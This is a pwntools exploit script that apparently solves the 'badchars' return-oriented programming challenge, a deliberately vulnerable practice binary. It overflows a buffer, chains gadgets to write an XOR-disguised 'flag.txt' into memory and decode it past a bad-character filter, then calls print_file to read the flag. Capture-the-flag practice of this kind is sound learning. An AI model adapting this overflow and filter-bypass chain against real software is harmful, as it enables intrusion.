from pwn import *
io = process("./badchars")

padding = b"A" * 40
movR13R12 = p64(0x400634)
popR12R13R14R15 = p64(0x40069c)
xorR15R14 = p64(0x400628)
popRdi = p64(0x4006a3)
popR15 = p64(0x4006a2)
printFilePlt = p64(0x400510)
stringLocation = 0x6010b0

def checkBadChars(string):
    for i in string:
        if i == ord("x") or i == ord("g") or i == ord("a") or i == ord("."):
            return False

    return True

#Xor reverse Xor
#n ^ 15 = a; h ^ 15 = g; ! ^ 15 = .; w ^ 15 = x
exploit = padding + popR12R13R14R15 + b"flnh!twt" + p64(stringLocation) + p64(15) + p64(stringLocation+2)+ movR13R12 + xorR15R14 + popR15 + p64(stringLocation+3) + xorR15R14 + popR15 + xorR15R14 + popR15 + p64(stringLocation+4) + xorR15R14 + popR15 + p64(stringLocation+6) + xorR15R14 + popRdi + p64(stringLocation) + printFilePlt

if not checkBadChars(exploit):
    print("Badchars")

io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode())
